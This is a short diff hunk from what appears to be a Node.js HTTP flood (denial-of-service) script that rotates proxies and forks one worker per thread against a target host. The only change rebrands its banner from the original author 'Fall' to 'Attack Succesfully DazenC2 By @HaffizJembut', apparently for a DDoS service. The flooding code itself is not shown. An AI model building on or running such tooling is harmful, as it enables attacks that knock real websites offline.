@@ -48,7 +48,7 @@ function proxyr() {
   return proxys[Math.floor(Math.random() * proxys.length)];
 }
 if (cluster.isMaster) {
-  console.log("\x1B[36mURL: \x1B[37m" + url.parse(target).host + "\n\x1B[36mThread: \x1B[37m" + thread + "\n\x1B[36mTime: \x1B[37m" + time + "\n\x1B[36mSCRIPT BY : \x1BFall \n\x1B Dont Share This Script -Fall ");
+  console.log("\x1B[36mURL: \x1B[37m" + url.parse(target).host + "\n\x1B[36mThread: \x1B[37m" + thread + "\n\x1B[36mTime: \x1B[37m" + time + "\n\x1B[36mAttack Succesfully\x1BDazenC2 \n\x1B DazenC2 By @HaffizJembut ");
   for (var bb = 0x0; bb < thread; bb++) {
     cluster.fork();
   }
